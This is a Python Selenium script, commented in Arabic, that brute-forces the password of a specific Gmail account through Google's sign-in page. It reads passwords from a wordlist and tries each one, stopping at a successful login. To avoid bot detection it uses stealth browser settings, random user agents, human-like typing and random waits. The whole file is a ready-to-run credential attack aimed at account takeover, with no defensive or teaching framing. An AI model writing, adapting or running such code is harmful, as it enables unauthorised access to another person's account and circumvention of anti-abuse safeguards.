import time
import random
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from fake_useragent import UserAgent
from selenium_stealth import stealth
import undetected_chromedriver as uc

def human_type(element, text, delay_range=(0.1, 0.4)):
    """كتابة نص بطريقة بشرية مع تأخير عشوائي"""
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(*delay_range))

def setup_driver():
    """إعداد وتكوين متصفح Chrome"""
    chrome_options = uc.ChromeOptions()
    
    # إعدادات لتجنب الكشف
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-popup-blocking")
    chrome_options.add_argument("--profile-directory=Default")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--start-maximized")
    
    # تغيير وكيل المستخدم
    ua = UserAgent()
    user_agent = ua.random
    chrome_options.add_argument(f'--user-agent={user_agent}')
    
    # استخدام undetected_chromedriver لتجنب الكشف
    driver = uc.Chrome(service=Service('chromedriver.exe'), options=chrome_options)
    
    # إخفاء سيلينيوم
    stealth(driver,
            languages=["en-US", "en"],
            vendor="Google Inc.",
            platform="Win32",
            webgl_vendor="Intel Inc.",
            fix_hairline=True,
            )
    
    return driver

def login_attempt(driver, password):
    """محاولة تسجيل الدخول بكلمة مرور معينة"""
    try:
        # الانتقال إلى صفحة تسجيل الدخول
        driver.get("https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmyaccount.google.com%3Futm_source%3Daccount-marketing-page%26utm_medium%3Dcreate-account-button&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-95539954%3A1717678405271169&theme=glif")
        time.sleep(random.uniform(2, 5))
        
        # إدخال البريد الإلكتروني
        email_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "identifierId"))
        )
        email_field.clear()
        human_type(email_field, "cezo383907@gmail.com")
        
        # النقر على زر التالي
        next_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "identifierNext"))
        )
        next_button.click()
        time.sleep(random.uniform(3, 6))
        
        # إدخال كلمة المرور
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "Passwd"))
        )
        password_field.clear()
        human_type(password_field, password)
        
        # النقر على زر تسجيل الدخول
        login_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, "passwordNext"))
        )
        login_button.click()
        time.sleep(random.uniform(5, 10))
        
        # التحقق من نجاح تسجيل الدخول
        if "myaccount.google.com" in driver.current_url:
            return True
        return False
        
    except Exception as e:
        print(f"⚠️ حدث خطأ: {str(e)}")
        return False

def main():
    driver = setup_driver()
    
    try:
        # قراءة كلمات المرور من الملف
        with open("wordlist.txt", "r") as f:
            passwords = [p.strip() for p in f.readlines() if p.strip()]
        
        # تجربة كل كلمة مرور
        for i, password in enumerate(passwords):
            print(f"🔍 جرب كلمة المرور: {password} (المحاولة {i+1}/{len(passwords)})")
            
            if login_attempt(driver, password):
                print(f"✅ تم العثور على كلمة المرور الصحيحة: {password}")
                break
            else:
                print(f"❌ كلمة المرور خاطئة: {password}")
                
                # تأخير عشوائي طويل بين المحاولات
                delay = random.uniform(30, 120)
                print(f"⏳ انتظر {delay:.1f} ثانية قبل المحاولة التالية...")
                time.sleep(delay)
                
    finally:
        driver.quit()

if __name__ == "__main__":
    main()